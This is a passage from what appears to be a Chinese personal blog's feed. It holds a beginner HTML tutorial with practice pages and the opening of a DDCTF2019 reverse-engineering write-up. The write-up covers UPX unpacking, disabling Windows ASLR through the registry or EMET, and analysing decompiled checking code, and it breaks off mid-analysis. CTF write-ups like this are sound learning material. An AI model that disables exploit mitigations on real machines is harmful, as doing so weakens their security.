        &lt;h1 id=&quot;ROP题目练习&quot;&gt;&lt;a href=&quot;#ROP题目练习&quot; class=&quot;headerlink&quot; title=&quot;ROP题目练习&quot;&gt;&lt;/a&gt;ROP题目练习&lt;/h1&gt;&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前
      
    
    </summary>
    
    
      <category term="ROP" scheme="http://chumen77.xyz/tags/ROP/"/>
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>HTML 基础</title>
    <link href="http://chumen77.xyz/2019/12/29/HTML%20%E5%9F%BA%E7%A1%80/"/>
    <id>http://chumen77.xyz/2019/12/29/HTML 基础/</id>
    <published>2019-12-29T13:42:51.000Z</published>
    <updated>2020-02-28T07:52:37.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="HTML-基础"><a href="#HTML-基础" class="headerlink" title="HTML 基础"></a>HTML 基础</h2><ol><li><strong>HTML标题</strong>：是通过 <code>&lt;h1&gt; - &lt;h6&gt;</code> 标签来定义的.；其会因为数字变化而显示的字体大小变化；</li><li><strong>HTML段落</strong>：通过标签<code>&lt;p&gt;</code> 来定义的.</li><li><strong>HTML链接</strong>：通过标签<code>&lt;a&gt;</code>来定义的。</li><li><strong>HTML图像</strong>：通过标签 <code>&lt;img&gt;</code> 来定义的。</li></ol><h2 id="HTML-文本"><a href="#HTML-文本" class="headerlink" title="HTML 文本"></a>HTML 文本</h2><h4 id="HTML-标题"><a href="#HTML-标题" class="headerlink" title="HTML 标题"></a>HTML 标题</h4><p>标题（Heading）是通过<code>&lt;h1&gt; - &lt;h6&gt;</code> 标签进行定义的.<code>&lt;h1&gt;</code> 定义最大的标题。 <code>&lt;h6&gt;</code>定义最小的标题。<strong>浏览器会自动地在标题的前后添加空行。</strong></p><ul><li><p>标题很重要：</p><p>不要仅仅是为了生成<strong>粗体</strong>或<strong>大号</strong>的文本而使用标题，而是==为了用户可以通过标题来快速浏览您的网页应该将 h1 用作主标题==（最重要的），其后是 h2（次重要的），再其次是 h3，以此类推。</p></li></ul><h4 id="HTML-注释"><a href="#HTML-注释" class="headerlink" title="HTML 注释"></a>HTML 注释</h4><p><strong>注释</strong>： 开始括号之后（左边的括号）需要紧跟一个叹号，结束括号之前（右边的括号）不需要，合理地使用注释可以对未来的代码编辑工作产生帮助。。</p><pre><code class="html">&lt;!-- 这是一个注释 --&gt;</code></pre><h4 id="HTML-段落"><a href="#HTML-段落" class="headerlink" title="HTML 段落"></a>HTML 段落</h4><p>浏览器会自动地在段落的前后添加空行。<strong>（<code>&lt;/p&gt;</code>是块级元素）</strong></p><h4 id="HTML-水平线"><a href="#HTML-水平线" class="headerlink" title="HTML 水平线"></a>HTML 水平线</h4><p>1：<code>&lt;hr&gt;</code>标签在 HTML 页面中创建水平线。</p><h4 id="HTML-文本格式化"><a href="#HTML-文本格式化" class="headerlink" title="HTML 文本格式化"></a>HTML 文本格式化</h4><p>通常用到<code>&lt;strong&gt;&lt;em&gt;&lt;del&gt;</code>这几个标签。</p><h4 id="练习："><a href="#练习：" class="headerlink" title="练习："></a>练习：</h4><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;文本&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;!-- &lt;h1&gt;标题1&lt;/h1&gt;    &lt;h2&gt;标题2&lt;/h2&gt;    &lt;h3&gt;标题3&lt;/h3&gt;    &lt;h4&gt;标题4&lt;/h4&gt;    &lt;h5&gt;标题5&lt;/h5&gt;    &lt;h6&gt;标题6&lt;/h6&gt; --&gt;    &lt;!-- &lt;h&gt;标签有大小之分 --&gt;        &lt;h2&gt;五花山&lt;/h2&gt;        &lt;p&gt;我家住在大山里。你知道这里的山是什么颜色的吗？&lt;/p&gt;        &lt;p&gt;春天的山是绿色的，那绿色淡淡的，许多树叶刚冒出芽来，还带着嫩嫩的黄色呢。&lt;/p&gt;        &lt;p&gt;夏天的山也是绿色的，那绿色浓浓的，一片片树叶，不管是大的还是小的，都像被绿油彩涂过，连雨点落上去，都给染绿了。&lt;/p&gt;        &lt;p&gt;秋天的山不再是一种颜色了。下过一场秋霜有的树林变成了金黄色□好像所有的阳光都集中到那儿去了有的树林变成了杏黄色远远望去，就像枝头挂满了熟透的杏和梨；有的树林变成了火红色，风一吹，树林跳起舞来，就像一簇簇火苗在跳跃；还有的树林变得紫红紫红，跟剧场里的紫绒幕布的颜色一样。只有松柏不怕秋霜，针一样的叶子还是那么翠绿。&lt;/p&gt;        &lt;p&gt;秋天的山一片金黄，一片火红，一片翠绿……人们给这五颜六色的山起了个好听的名字，叫“&lt;strong&gt;&lt;em&gt; &lt;del&gt;五花山&lt;/del&gt;&lt;/em&gt;&lt;/strong&gt;”。&lt;/p&gt;  &lt;!-- 几个标签的嵌套 --&gt;         &lt;strong&gt;加粗&lt;/strong&gt; &lt;em&gt;斜体&lt;/em&gt; &lt;del&gt;删除文字&lt;/del&gt;&lt;!-- &lt;span&gt;配合css&lt;/span&gt; --&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>效果：</p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/wenben.jpg?raw=true" srcset="/img/loading.gif" alt></p><h2 id="HTML-图像"><a href="#HTML-图像" class="headerlink" title="HTML 图像"></a>HTML 图像</h2><p> ==<strong>HTML 图像-</strong>== ：</p><ol><li>标签（ <code>&lt;img&gt;</code>）是空标签，意思是说，它只包含属性，并且没有闭合标签。</li><li>源属性（<code>&lt;src&gt;</code>）是图像的 URL 地址。分为本地和网上，本地图片写路径的时候注意<strong>绝对路径和相对路径</strong>（可以用<code>../</code>来返回 一级目录，返回几级目录就写几个它就行)。</li><li>Alt属性:alt 属性用来为图像定义一串预备的可替换的文本,在浏览器无法载入图像时,告用户图片的信息。<strong>==搜索引擎也是通过此描述来收集图片的==</strong>.</li><li>高度与宽度:height（高度） 与 width（宽度）属性用于设置图像的高度与宽度。属性值默认单位为像素px。</li></ol><p>练习：</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;图片&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;img src=&quot;1.png&quot; alt=&quot;chumen的qq图像&quot; title=&quot;chumen的qq图像&quot;&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h4 id="图片的映射"><a href="#图片的映射" class="headerlink" title="图片的映射"></a>图片的映射</h4><p>目标是为了在一张图片上的<strong>某个位置</strong>点击后<strong>才</strong>可以实现某个功能。</p><p>这需要用到<code>usemap=&quot;#diyname&quot;</code> 然后用<code>&lt;map name=&quot;diyname&quot;&gt;&lt;/map&gt;</code>标签来对应。</p><p>核心代码：`<map name="1map"></map></p><pre><code>    &lt;area shape=&quot;&quot; coords=&quot;&quot; href=&quot;&quot;&gt;</code></pre><p>\\`</p><p>shape是选择的形状，coords是坐标，坐标确定<strong>推荐用qq的截图功能那里来确定</strong>，比如：</p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/quzuobiao.jpg?raw=true" srcset="/img/loading.gif" alt></p><p>那这个彩色箭头指的位置就是在这个图像的（233,456）位置。</p><p><strong>练习：</strong></p><pre><code class="HTML">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;图片的映射&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;img src=&quot;1.png&quot; alt=&quot;&quot; usemap=&quot;#1map&quot;&gt;    &lt;map name=&quot;1map&quot;&gt;        &lt;area shape=&quot;circle&quot; coords=&quot;300,255,50&quot; target=&quot;_blank&quot; href=&quot;http://www.baidu.com&quot;&gt;    &lt;/map&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><strong>效果</strong>：<img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/yingshe.jpg?raw=true" srcset="/img/loading.gif" alt></p><h2 id="HTML-超链接"><a href="#HTML-超链接" class="headerlink" title="HTML 超链接"></a>HTML 超链接</h2><p>超链接可以是一个字，一个词，或者一组词，也可以是一幅图像，您可以点击这些内容来跳转到新的文档或者当前文档中的某个部分。使用标签 <code>&lt;a&gt;</code>来设置超文本链接。</p><ul><li><p><strong>HTML 链接语法</strong>:<code>&lt;a href=&quot;url&quot;&gt;链接文本&lt;/a&gt;</code>  ,href 属性描述了链接的目标。</p></li><li><p><strong>target 属性</strong>  :<code>target=&quot;_blank&quot;</code>效果就是在新窗口（空白界面）做出来 。</p></li><li><p><strong>id 属性</strong>:id属性可用于创建在一个HTML文档书签标记,在HTML文档中插入ID:</p><p><code>&lt;a id=&quot;tips&quot;&gt;有用的提示部分&lt;/a&gt;</code> </p><p>在HTML文档中创建一个链接到”有用的提示部分(id=”tips”）”:</p><p><code>&lt;a href=&quot;#tips&quot;&gt;访问有用的提示部分&lt;/a&gt;</code></p></li></ul><p><strong>解释加补充</strong>：ID 属性名字只能有一个不可重复，且必须以==字母==开头，可以在一个界面的任何位置的内容进行设置ID，在设置完后，（<code>&lt;a href=&quot;# &quot;&gt;</code>），在==“#”==后加入id的名称即可跳转到你设置ID的内容处。</p><p><code>&lt;a name=&quot;end&quot;&gt;&lt;/a&gt;</code> <code>&lt;a href=&quot;#end&quot;&gt;end&lt;/a&gt;</code>    <strong>做锚点时，替换id的方法，作用可以实现一样！id不好用时用这个</strong></p><p><strong>练习：</strong>（为了方便阅读，省略了很多的<code>&lt;br&gt;</code>.）</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;meta charset=&quot;utf-8&quot;&gt;    &lt;title&gt;超级链接&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;a href=&quot;http://www.mi.com&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;1.png&quot;&gt;&lt;/a&gt;    &lt;!-- /*书签标记：锚点*/ --&gt;    &lt;a href=&quot;#end&quot;&gt;end&lt;/a&gt;&lt;br id=&quot;aa&quot;&gt;&lt;br&gt;&lt;br id=&quot;miao&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;a name=&quot;miao&quot;&gt;&lt;/a&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;a name=&quot;end&quot;&gt;&lt;/a&gt;  &lt;a href=&quot;#miao&quot;&gt;miao&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h2 id="HTML-列表"><a href="#HTML-列表" class="headerlink" title="HTML 列表"></a>HTML 列表</h2><ul><li><strong>HTML无序列表</strong>：<code>&lt;ul&gt;</code>与 <code>&lt;li&gt;</code>其点的样式(圆圈，圆心，正方形）用<strong>css</strong>来控制<code>&lt;ul style=&quot;list-style-type:circle&quot;&gt;</code></li><li><strong>HTML 有序列表</strong> <code>&lt;ol&gt;</code>与<code>&lt;li&gt;</code>   用法和无序相似，<strong>且有序与无序之间可以互相嵌套</strong>，<strong>嵌套过程中点的形状也会自动变化。</strong></li><li><strong>HTML 自定义列表</strong>：这个是比较常用的，自定义列表以<code>&lt;dl&gt;</code> 标签开始。每个自定义列表项以 <code>&lt;dt&gt;</code> 开始。每个自定义列表项的定义以 <code>&lt;dd&gt;</code>开始。其<strong>不仅仅是一列项目，而是项目及其注释的组合。</strong></li></ul><pre><code class="html">&lt;dl&gt;&lt;dt&gt;Coffee&lt;/dt&gt;    &lt;!-- 列表标题 --&gt;&lt;dd&gt;- black hot drink&lt;/dd&gt;   &lt;!-- 其内容 --&gt;&lt;dt&gt;Milk&lt;/dt&gt; &lt;dd&gt;- white cold drink&lt;/dd&gt;&lt;/dl&gt;</code></pre><p><strong>练习：</strong></p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;列表&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;ul style=&quot;list-style-type:circle&quot;&gt;        &lt;li&gt;无序列表1&lt;/li&gt;        &lt;li&gt;无序列表2&lt;/li&gt;        &lt;li&gt;无序列表3&lt;/li&gt;        &lt;li&gt;无序列表4&lt;/li&gt;    &lt;/ul&gt;    &lt;ol&gt;        &lt;li&gt;有序列表1&lt;/li&gt;        &lt;li&gt;有序列表2&lt;/li&gt;        &lt;li&gt;有序列表3&lt;/li&gt;        &lt;li&gt;有序列表4&lt;/li&gt;    &lt;/ol&gt;    &lt;dl&gt;        &lt;dt&gt;标题1&lt;/dt&gt;        &lt;dd&gt;自定义列表1&lt;/dd&gt;        &lt;dd&gt;自定义列表2&lt;/dd&gt;        &lt;dd&gt;自定义列表3&lt;/dd&gt;        &lt;dd&gt;自定义列表4&lt;/dd&gt;        &lt;dt&gt;标题2&lt;/dt&gt;        &lt;dd&gt;自定义列表1&lt;/dd&gt;        &lt;dd&gt;自定义列表2&lt;/dd&gt;        &lt;dd&gt;自定义列表3&lt;/dd&gt;        &lt;dd&gt;自定义列表4&lt;/dd&gt;    &lt;/dl&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>效果：</p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/liebiao.jpg?raw=true" srcset="/img/loading.gif" alt></p><h2 id="HTML表格"><a href="#HTML表格" class="headerlink" title="HTML表格"></a>HTML表格</h2><ul><li><p><strong>HTML 表格</strong>：表格由 <code>&lt;table&gt;</code>标签来定义。每个表格均有若干==行==（由 <code>&lt;tr&gt;</code> 标签定义），每行被分割为若干==单元格==（由 <code>&lt;td&gt;</code> 标签定义）。字母 td 指<strong>表格数据</strong>（table data），即数<strong>据单元格的内容</strong>。数据单元格可以包含<strong>文本、图片、列表、段落、表单、水平线、表格</strong>等等。这个有利于多样化，在分清栏目后在td里放内容就ok。</p></li><li><p><strong>HTML 边框属性</strong>:<code>&lt;table border=&quot;1&quot;&gt;</code>会出现表框。</p></li><li><p><strong>HTML 表格表头</strong>:表格的表头使用 <code>&lt;th&gt;</code> 标签进行定义。<code>&lt;th&gt;</code>标签与<code>&lt;td&gt;</code>标签<strong>用法相似只是显示的效果不同，会有粗体居中的效果；</strong></p></li><li><p><strong>HTML表格合并</strong>：用 <strong>colspan</strong>： 横向行  <strong>rowspan</strong>  ：竖纵行。</p></li><li><p><strong>HTML表格单元格边距的设置</strong>：类似 <strong>设置边框</strong> 直接在table标签里放入<strong>cellpadding=“自定义的数字”</strong>，就设置好了。</p></li></ul><p><strong>练习：</strong></p><pre><code class="HTML">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;表格&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;table border=&quot;1&quot;&gt;         &lt;tr&gt;           &lt;th&gt;部门&lt;/th&gt;           &lt;th&gt;姓名&lt;/th&gt;           &lt;th&gt;性别&lt;/th&gt;           &lt;th&gt;工资&lt;/th&gt;         &lt;/tr&gt;         &lt;tr&gt;             &lt;td rowspan=&quot;3&quot;&gt;开发组&lt;/td&gt;             &lt;td&gt;小明&lt;/td&gt;             &lt;td&gt;男&lt;/td&gt;             &lt;td&gt;1w&lt;/td&gt;         &lt;/tr&gt;         &lt;tr&gt;             &lt;td&gt;小白&lt;/td&gt;             &lt;td&gt;女&lt;/td&gt;             &lt;td&gt;1w&lt;/td&gt;         &lt;/tr&gt;         &lt;tr&gt;         &lt;td colspan=&quot;2&quot;&gt;工资合计&lt;/td&gt;         &lt;td&gt;2w&lt;/td&gt;         &lt;/tr&gt;    &lt;/table&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><strong>效果：</strong></p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/biaoge.jpg?raw=true" srcset="/img/loading.gif" alt></p><h2 id="HTML-表单"><a href="#HTML-表单" class="headerlink" title="HTML 表单"></a>HTML 表单</h2><p>表单是一个包含<strong>表单元素</strong>的区域。表单元素是允许用户在表单中输入内容,比如：文本域(textarea)、下拉列表、单选框(radio-buttons)、复选框(checkboxes)等等。</p><p>`<form><br>input元素</form></p>\\\\\`<h4 id="HTML-表单-输入元素"><a href="#HTML-表单-输入元素" class="headerlink" title="HTML 表单 - 输入元素"></a>HTML 表单 - 输入元素</h4><p>输入标签<code>&lt;input&gt;</code>。</p><h4 id="文本域"><a href="#文本域" class="headerlink" title="文本域"></a>文本域</h4><p>文本域通过<code>&lt;input type=&quot;text&quot;&gt;</code> 标签来设定，当用户要在表单中键入字母、数字等内容时，就会用到文本域。</p><p>`<form><br>First name: <input type="text" name="firstname"><br><br>Last name: <input type="text" name="lastname"></form></p>\\\\\`<p><strong>在大多数浏览器中，文本域的缺省宽度是20个字符。</strong></p><h4 id="密码字段"><a href="#密码字段" class="headerlink" title="密码字段"></a>密码字段</h4><p><code>&lt;input type=&quot;password&quot;&gt;</code> 来定义</p><pre><code class="html">&lt;form&gt;Password: &lt;input type=&quot;password&quot; name=&quot;pwd&quot;&gt;&lt;/form&gt;</code></pre><h4 id="单选按钮"><a href="#单选按钮" class="headerlink" title="单选按钮"></a>单选按钮</h4><p><code>&lt;input type=&quot;radio&quot;&gt;</code> 标签定义了表单单选框选项。</p><pre><code class="html">&lt;form&gt;&lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;male&quot;&gt;Male&lt;br&gt;&lt;input type=&quot;radio&quot; name=&quot;sex&quot;value=&quot;female&quot;&gt;Female&lt;/form&gt;</code></pre><p><strong>Name 是可以进行==分组==。想要有效果 value也少不了。</strong></p><h4 id="复选框"><a href="#复选框" class="headerlink" title="复选框"></a>复选框</h4><p><code>&lt;input type=&quot;checkbox&quot;&gt;</code>定义了复选框. 用户需要从若干给定的选择中选取一个或若干选项。</p><pre><code class="html">&lt;form&gt;&lt;input type=&quot;checkbox&quot; name=&quot;vehicle&quot; value=&quot;Bike&quot;&gt;I have a bike&lt;br&gt;&lt;input type=&quot;checkbox&quot; name=&quot;vehicle&quot; value=&quot;Car&quot;&gt;I have a car &lt;/form&gt;</code></pre><p><strong>类似单选三者缺一不可。</strong></p><h4 id="提交按钮"><a href="#提交按钮" class="headerlink" title="提交按钮"></a>提交按钮</h4><p><code>&lt;input type=&quot;submit&quot;&gt;</code>定义了提交按钮. </p><pre><code class="html">&lt;form name=&quot;input&quot; action=&quot;&quot; method=&quot;&quot;&gt;Username: &lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;&lt;/form&gt;</code></pre><p>==value：提交数据到服务器的值（后台程序PHP使用）写按钮时一定要写上。   name：为控件命名，以备后台程序 ASP、PHP 使用==</p><h4 id="练习：-1"><a href="#练习：-1" class="headerlink" title="练习："></a>练习：</h4><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;表单&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;form action=&quot;&quot;&gt; &lt;!-- action 中值为提交的网页 --&gt;&lt;!-- 默认为get --&gt;        admin&lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;        password&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt; &lt;br&gt;        &lt;input type=&quot;radio&quot; name=&quot;sex1&quot; value=&quot;male&quot;&gt;男 &lt;br&gt;        &lt;input type=&quot;radio&quot; name=&quot;sex1&quot; value=&quot;female&quot;&gt;女          &lt;input type=&quot;radio&quot; name=&quot;sex&quot;&gt;中性&lt;!-- name中值一样那么其分组就一样 --&gt;        &lt;!-- &lt;input type=&quot;radio&quot; name=&quot;sex&quot;&gt;男        &lt;input type=&quot;radio&quot; name=&quot;sex&quot;&gt;女        &lt;input type=&quot;radio&quot; name=&quot;sex&quot;&gt;中性 --&gt;        &lt;br&gt;        &lt;!-- 兴趣复选框 --&gt;        &lt;input type=&quot;checkbox&quot; name=&quot;xq&quot; value=&quot;kanshu&quot;&gt; 看书        &lt;input type=&quot;checkbox&quot; name=&quot;xq&quot; value=&quot;xuexi&quot;&gt;  学习        &lt;input type=&quot;checkbox&quot; name=&quot;xq&quot; value=&quot;music&quot;&gt;  听歌        &lt;br&gt;    城市&lt;select name=&quot;city&quot;&gt;            &lt;option value=&quot;shanghai&quot;&gt;上海&lt;/option&gt;            &lt;option value=&quot;beijing&quot;&gt;北京&lt;/option&gt;        &lt;/select&gt;        &lt;input type=&quot;submit&quot; name=&quot;&quot;&gt;&lt;br&gt;    &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>效果：</p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/biaodan.jpg?raw=true" srcset="/img/loading.gif" alt></p><h2 id="HTML布局"><a href="#HTML布局" class="headerlink" title="HTML布局"></a>HTML布局</h2><p><strong>HTML 布局 - 使用<code>&lt;div&gt;</code> 元素.</strong></p><p>可以先分为头部div 底部div 和中间的div，然后逐步添加标签进行扩充，用<strong>css</strong>来设置样式。</p><p>这中间需要用到float：left等 来控制一个div中套用的div的位置。</p><ul><li>HTML中<code>&lt;div&gt;</code>元素是块级元素，它可用于组合其他 HTML元素的容器。</li><li><code>&lt;div&gt;</code> 元素的另一个常见的用途是文档布局。<code>&lt;div&gt;</code>元素经常与 <strong>CSS</strong> 一起使用，用来布局网页。</li><li><code>&lt;div&gt;</code> 元素没有特定的含义。</li></ul><p><strong>练习：</strong></p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;布局&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;!-- &lt;div style=&quot;background: yellow; width: 50px;&quot;&gt;        这是个div这是个div这是个div这是个div    &lt;/div&gt; --&gt;    &lt;div style=&quot;background: yellow;height: 100px;&quot;&gt;导航&lt;/div&gt;    &lt;div style=&quot;background: green;width: 20%; float: left; height: 300px;&quot;&gt;菜单&lt;/div&gt;    &lt;di+v style=&quot;background: red;width: 80%; float: left;height: 300px;&quot;&gt;内容&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h2 id="HTML嵌套规则"><a href="#HTML嵌套规则" class="headerlink" title="HTML嵌套规则"></a>HTML嵌套规则</h2><h4 id="元素分类："><a href="#元素分类：" class="headerlink" title="元素分类："></a>元素分类：</h4><ul><li><strong>文字类块元素</strong>：p  h1~h6</li><li><strong>容器类块元素</strong>：div table tr td th form ul li ol dl dt dd</li><li><strong>行元素</strong>:不独立成行，不可以  内容决定a img input strong em del span</li><li><strong>特殊字符</strong>:br </li></ul><h4 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h4><ul><li>块元素可以嵌套行元素 <code>&lt;div&gt;这是div &lt;a href=&quot;&quot;&gt;这是a&lt;/a&gt; &lt;/div&gt;</code></li><li>行元素可以嵌套行元素 <code>&lt;a href=&quot;&quot;&gt;这是个&lt;strong〉 a&lt;/strong&gt;</code></li><li>行元素不可以嵌套块元素</li><li>文字类抉元素不可以嵌套块元素</li><li>容器类抉元素可以嵌套块元素</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;HTML-基础&quot;&gt;&lt;a href=&quot;#HTML-基础&quot; class=&quot;headerlink&quot; title=&quot;HTML 基础&quot;&gt;&lt;/a&gt;HTML 基础&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;HTML标题&lt;/strong&gt;：是通过 &lt;code&gt;&amp;lt;h1&amp;gt;
      
    
    </summary>
    
    
      <category term="学习记录" scheme="http://chumen77.xyz/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>DDCTF2019-RE-Windows Reverse</title>
    <link href="http://chumen77.xyz/2019/11/17/DDCTF2019-RE-Windows%20Reverse/"/>
    <id>http://chumen77.xyz/2019/11/17/DDCTF2019-RE-Windows Reverse/</id>
    <published>2019-11-17T09:38:51.000Z</published>
    <updated>2020-02-28T07:52:52.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DDCTF2019-RE-Windows-Reverse"><a href="#DDCTF2019-RE-Windows-Reverse" class="headerlink" title="DDCTF2019-RE-Windows Reverse"></a>DDCTF2019-RE-Windows Reverse</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在一个论坛里发现DDCTF这两道逆向题不是很难，就想着做一下练练手。因为最近做的都是比较老的题目，这个还算新一点的。题目下载：<br><a href="https://raw.githubusercontent.com/chumen77/chumen77.github.io/master/2019/11/17/DDCTF2019-RE-Windows Reverse/reverse1_final.zip" target="_blank">reverse1_final.zip</a><br><a href="https://raw.githubusercontent.com/chumen77/chumen77.github.io/master/2019/11/17/DDCTF2019-RE-Windows Reverse/reverse2_final.exe.zip" target="_blank">reverse2_final.exe.zip</a></p><h2 id="reverse1-final-exe"><a href="#reverse1-final-exe" class="headerlink" title="reverse1_final.exe"></a>reverse1_final.exe</h2><h3 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h3><p><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739838372961.jpg" srcset="/img/loading.gif" alt="-w539"><br>可以看出是UPX壳。<br>另外：</p><pre><code> /Volumes/data/ctf逆向题目/2019ddctf  file reverse1_final.exereverse1_final.exe: PE32 executable (console) Intel 80386, for MS Windows, UPX compressed</code></pre><p>在mac终端也可以用file命令查出。</p><h3 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h3><p>直接在终端UPX -d 脱了就可以了。</p><h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><p>发现直接是运行不了的，想到是不是因为脱壳后这个需要资源修复，各种操作修复后发现还是不可以。最后查询他人wp发现这个程序开启了<strong>ASLR</strong>。需要pe工具去关闭这个程序的ASLR。然后我就去查了ASLR是怎么关闭的，且其是什么东西。</p><h4 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h4><p>ASLR通过随机放置进程关键数据区域的地址空间来防止攻击者能可靠地跳转到内存的特定位置来利用函数。现代操作系统一般都加设这一机制，以防范恶意程序对已知地址进行Return-to-libc攻击。 –百度百科<br>随后又查询到win7以后的windows系统都是有这个机制的，<strong>但因为有它的存在每次od载入时，其映像基址都是会变化的，而你有时候需要计算一些地址，基址老是变</strong>。以前我是不知道这个的，知道以后感觉这个是更加利于对程序的分析，就想着直接关闭windows7的ASLR。</p><h4 id="关闭ASLR"><a href="#关闭ASLR" class="headerlink" title="关闭ASLR"></a>关闭ASLR</h4><p>有两种办法。</p><h5 id="改注册表"><a href="#改注册表" class="headerlink" title="改注册表"></a>改注册表</h5><p><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739848952944.jpg" srcset="/img/loading.gif" alt="-w901"><br>注册表添加了一个DWORD键值项，其值为0。注意其名称和路径。</p><h5 id="软件关闭"><a href="#软件关闭" class="headerlink" title="软件关闭"></a>软件关闭</h5><p>下载EMET：<a href="https://www.updatestar.com/directdownload/emet/2258274" target="_blank" rel="noopener">https://www.updatestar.com/directdownload/emet/2258274</a><br><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739850550859.jpg" srcset="/img/loading.gif" alt="-w730"><br>关闭后重启即可。</p><h4 id="成功运行"><a href="#成功运行" class="headerlink" title="成功运行"></a>成功运行</h4><p>程序成功运行后发现：<br><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739851761277.jpg" srcset="/img/loading.gif" alt="-w499"><br>这个估计又是字符对比。用IDA打开分析其逻辑。</p><h3 id="IDA静态分析"><a href="#IDA静态分析" class="headerlink" title="IDA静态分析"></a>IDA静态分析</h3><h4 id="主函数"><a href="#主函数" class="headerlink" title="主函数"></a>主函数</h4><pre><code>int __cdecl main(int argc, const char **argv, const char **envp){  char v4; // [esp+4h] [ebp-804h]  char v5; // [esp+5h] [ebp-803h]  char v6; // [esp+404h] [ebp-404h]  char Dst; // [esp+405h] [ebp-403h]  v6 = 0;  memset(&amp;Dst, 0, 0x3FFu);  v4 = 0;  memset(&amp;v5, 0, 0x3FFu);  printf(&quot;please input code:&quot;);  scanf(&quot;%s&quot;, &amp;v6);  sub_401000(&amp;v6);  if ( !strcmp(&amp;v4, &quot;DDCTF{reverseME}&quot;) )    printf(&quot;You&#39;ve got it!!%s\n&quot;, &amp;v4);  else    printf(&quot;Try again later.\n&quot;);  return 0;}</code></pre><p>代码很简单，可以看出来是在接受输入后，经过sub_401000函数分处理后与DDCTF{reverseME}对比，正确就输出You’ve got it!。</p><h4 id="处理函数sub-401000"><a href="#处理函数sub-401000" class="headerlink" title="处理函数sub_401000"></a>处理函数sub_401000</h4><pre><code>unsigned int __cdecl sub_401000(const char *a1){  _BYTE *v1; // ecx  unsigned int i; // edi  unsigned int result; // eax  const char *v4; // ebx  i = 0;  result = strlen(a1);  if ( result )  {    v4 = (a1 - v1);    do    {      *v1 = byte_402FF8[v1[v4]];      ++i;      ++v1;      result = strlen(a1);    }    while ( i &lt; result );  }  return result;}</code></pre><p>可以看出来输入的东西的确在这里进行了，一位位的处理。<br><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739858421447.jpg" srcset="/img/loading.gif" alt="-w521"><br>用这里的字符串进行了替换。<br><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739858895484.jpg" 